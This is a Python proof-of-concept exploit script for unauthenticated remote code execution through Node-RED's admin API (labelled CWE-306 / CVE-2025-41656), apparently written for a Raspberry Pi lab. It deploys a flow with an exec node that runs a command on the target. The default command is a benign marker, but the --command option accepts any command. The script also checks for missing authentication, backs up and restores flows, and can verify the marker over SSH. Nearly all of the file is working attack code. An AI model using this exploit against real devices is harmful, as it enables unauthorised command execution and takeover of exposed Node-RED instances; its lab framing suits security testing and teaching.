#Control Version 1.1

import argparse
import json
import subprocess
import sys
import time
from pathlib import Path

ERROR = '\033[91m [!!!]\033[0m'
WARNING = '\033[93m [*]\033[0m'
NOTIFICATION = '\033[96m[+]\033[0m'
CRITICAL = '\033[43m>>>\033[0m'
COLOUR_END = '\033[0m'
UNDERLINE = '\033[4m'

try:
    import requests
except ImportError:
    sys.exit(f"{ERROR} Request unavailable. Try: pip install requests")

OPTIONS = ["flows", "settings", "nodes", "context", "subflows", "palette"]

MARKER_FILE = "/tmp/PWNED_LAB_MARKER.txt"

DEFAULT_COMMAND = f"id; hostname; echo RCE_CONFIRMED > {MARKER_FILE}"


def buildFlow(command: str) -> list:
    """Tab + fire-once inject + exec node. The exec node is the whole exploit."""
    return [
        {
            "id": "nodeTab",
            "type": "tab",
            "label": "Remote Code Execution",
            "disabled": False,
        },
        {
            "id": "nodeInjection",
            "type": "inject",
            "z": "nodeTab",
            "name": "fireOnce_Inject",
            "once": True,
            "onceDelay": 0.1,
            "topic": "",
            "payload": "",
            "payloadType": "date",
            "wires": [["flowDeploy_exec"]]
        },
        {
            "id": "flowDeploy_exec",
            "type": "exec",
            "z": "nodeTab",
            "name": "confirmRCE",
            "command": command,
            "addpay": False,
            "append": "",
            "useSpawn": "false",
            "timer": "",
            "winHide": False,
            "oldrc": False,
            "wires": [[], [], []]
        }
    ]

def authCheck(baseURL: str) -> bool:
    checkURL = f"{baseURL}/settings"
    print(f"{NOTIFICATION} GET {checkURL}")
    print(f"\n{NOTIFICATION} Accessing authorization settings")
    try:
        r = requests.get(checkURL, timeout=5)
    except requests.exceptions.ConnectionError:
        print(f"{ERROR} {checkURL} could not be reached.")
        print(f"{WARNING} Try: Check host status")
        sys.exit(1)

    print(f" HTTP {r.status_code}")
    if r.status_code == 200:
        print(f"{NOTIFICATION} {checkURL} returned '200' without credentials")
        print(f"{CRITICAL} NO AUTHENTICATION NEEDED")
        print(f" Body: {r.text[:120]} \n")
        return True
    elif r.status_code == 401:
        print(f"{ERROR} {checkURL} returned '401' without credentials")
        return False
    else:
        print(f"{WARNING} Unexpected status {r.status_code}")
        return False

def backupFlows(baseURL: str, dest: Path) -> bool:
    """POST /flows is a FULL deploy: it replaces every flow on the device,
    including the baseline tick/publish flow that generates the MQTT telemetry.
    Save the current configuration first so the lab can be put back afterwards.
    The GET is also clean evidence of unauthenticated read access."""
    getURL = f"{baseURL}/flows"
    print(f"{NOTIFICATION} GET {getURL} -> {dest} (pre-deploy backup)")
    try:
        r = requests.get(getURL, timeout=10)
    except requests.exceptions.ConnectionError:
        print(f"{ERROR} Cannot reach {getURL}")
        return False

    if r.status_code != 200:
        print(f"{WARNING} Backup returned HTTP {r.status_code}; not saved")
        return False

    dest.write_text(r.text)
    try:
        count = len(json.loads(r.text))
    except json.JSONDecodeError:
        count = "?"
    print(f"{NOTIFICATION} Saved {count} existing node(s) to {dest}")
    print(f"{WARNING} Restore afterwards with: python3 flowDeploy.py --restore {dest}\n")
    return True

def restoreFlows(baseURL: str, src: Path) -> bool:
    if not src.exists():
        print(f"{ERROR} {src} not found - nothing to restore")
        return False
    body = src.read_text()
    print(f"{NOTIFICATION} POST {baseURL}/flows  <- {src}")
    resp = requests.post(f"{baseURL}/flows", headers={"Content-Type": "application/json"},
                         data=body, timeout=10)
    print(f"{NOTIFICATION} Response: HTTP {resp.status_code} {resp.reason}")
    if resp.status_code in (200, 204):
        print(f"{NOTIFICATION} Original flows restored - baseline telemetry should resume")
        return True
    print(f"{WARNING} Restore failed: {resp.text[:200]}")
    return False

def deployTarget_Flow(targetURL: str, flowPayload: list) -> bool:
    headers = {"Content-Type": "application/json"}
    body = json.dumps(flowPayload)

    print(f"{NOTIFICATION} POST {targetURL}")
    print(f"Content-Type: application/json")
    print(f"Authorization: disabled")
    print(f"Payload: {len(flowPayload)} nodes")
    print(f"(tab + inject + exec)")
    print(f"Exec command: {flowPayload[2]['command']}\n")

    try:
        resp = requests.post(targetURL, headers=headers, data=body, timeout=10)
    except requests.exceptions.ConnectionError:
        print(f"{WARNING} Cannot reach {targetURL}")
        print(f"Try: Check Pi state and services")
        sys.exit(1)

    print(f"{NOTIFICATION} Response: HTTP {resp.status_code} {resp.reason}")

    if resp.status_code in (200, 204):
        print(f"{NOTIFICATION} Flow deployment effective")
        print(f"{NOTIFICATION} exec node firing...")
        print(f"auditd firing -k rce_marker + -k proc_exec")
        return True
    elif resp.status_code == 401:
        print(f"{WARNING} 401 - adminAuth set. Try: 'grep adminAuth ~/.node-red/settings.js'")
        return False
    elif resp.status_code == 400:
        print(f"{WARNING} 400 - retrying with the v2 object body {{'flows': [...]}}")
        resp = requests.post(targetURL, headers=headers,
                             data=json.dumps({"flows": flowPayload}), timeout=10)
        print(f"{NOTIFICATION} Retry response: HTTP {resp.status_code} {resp.reason}")
        if resp.status_code in (200, 204):
            print(f"{NOTIFICATION} Flow deployment effective (v2 body)")
            return True
        print(f"{WARNING} Still failing: {resp.text[:200]}")
        return False
    else:
        print(f"{WARNING} Unknown response {resp.status_code}: {resp.text[:200]}")
        return False

def verifyRCE(piUser: str, targetHost: str, markerFile: str) -> None:
    print(f"\n{NOTIFICATION} Verifying RCE - reading {markerFile} on Pi via SSH ...")
    try:
        result = subprocess.run(
            ["ssh", f"{piUser}@{targetHost}",
             f"cat {markerFile} && stat {markerFile}"],
            capture_output=True, text=True, timeout=15
        )
        if result.returncode == 0:
            print(f"{NOTIFICATION} Marker file confirmed on Pi:")
            print(result.stdout)
        else:
            print(f"{ERROR} SSH returned rc={result.returncode}")
            print(result.stderr)
    except FileNotFoundError:
        print(f"{ERROR} ssh not found - verify manually:")
        print(f"    ssh {piUser}@{targetHost} 'cat {markerFile}'")
    except subprocess.TimeoutExpired:
        print(f"{ERROR} SSH timed out - verify manually on the Pi")

def askEndpoint() -> str:
    while True:
        choice = input("Target Topic (Enter '-h' for topic types): ")
        if choice == "-h":
            print("Available options:")
            for option in OPTIONS:
                print(f"  {option}")
            continue
        if choice in OPTIONS:
            print(f"Selected option: {choice}")
            return choice
        print("Invalid option. Enter -h to see available options.")

def main():
    parser = argparse.ArgumentParser(
        description="Node-RED unauthenticated admin API flow deploy (CWE-306 / CVE-2025-41656)"
    )
    parser.add_argument("--host", help="Target host (prompted if omitted)")
    parser.add_argument("--port", default=None, help="Target port (prompted if omitted)")
    parser.add_argument("--user", help="Pi username for SSH verification (prompted if omitted)")
    parser.add_argument("--endpoint", choices=OPTIONS, help="Admin API endpoint (prompted if omitted)")
    parser.add_argument("--command", default=DEFAULT_COMMAND,
                        help="Command for the exec node (default: the benign marker PoC)")
    parser.add_argument("--marker", default=MARKER_FILE,
                        help="Marker path checked by --verify (must match the auditd rule)")
    parser.add_argument("--backup", default="flows_backup.json",
                        help="Where to save the existing flows before deploying")
    parser.add_argument("--no-backup", action="store_true",
                        help="Skip the pre-deploy flow backup (not recommended)")
    parser.add_argument("--restore", metavar="FILE", nargs="?", const="flows_backup.json",
                        help="Restore flows from FILE and exit")
    parser.add_argument("--check", action="store_true", help="GET /settings pre-flight first")
    parser.add_argument("--verify", action="store_true", help="SSH in and read the marker back")
    parser.add_argument("--dry-run", action="store_true", help="Print the payload, send nothing")

    args = parser.parse_args()

    flowPayload = buildFlow(args.command)

    if args.dry_run:
        print(f"{NOTIFICATION} Dry-run active - flow payload unsent")
        print(json.dumps(flowPayload, indent=2))
        return

    targetHost = args.host or input("Target Host: ")
    targetPort = args.port or input("Target Port: ")
    baseURL = f"http://{targetHost}:{targetPort}"

    if args.restore:
        restoreFlows(baseURL, Path(args.restore))
        return

    piUser = args.user or input("Target Device User: ")
    endpoint = args.endpoint or askEndpoint()
    targetURL = f"{baseURL}/{endpoint}"
    print(f"Target URL: {targetURL}")

    if args.check:
        if not authCheck(baseURL):
            sys.exit(1)

    if endpoint == "flows" and not args.no_backup:
        backupFlows(baseURL, Path(args.backup))

    deploy = deployTarget_Flow(targetURL, flowPayload)

    if deploy and args.verify:
        print(f"{WARNING} Exec node booting - Wait 5 seconds")
        time.sleep(5)
        verifyRCE(piUser, targetHost, args.marker)

    if deploy:
        print("\n" + "-" * 60)
        if endpoint == "flows" and not args.no_backup:
            print(f"{WARNING} Baseline flows replaced. Restore when evidence is captured:")
            print(f"    python3 flowDeploy.py --host {targetHost} --port {targetPort} "
                  f"--restore {args.backup}")

if __name__ == "__main__":
    main()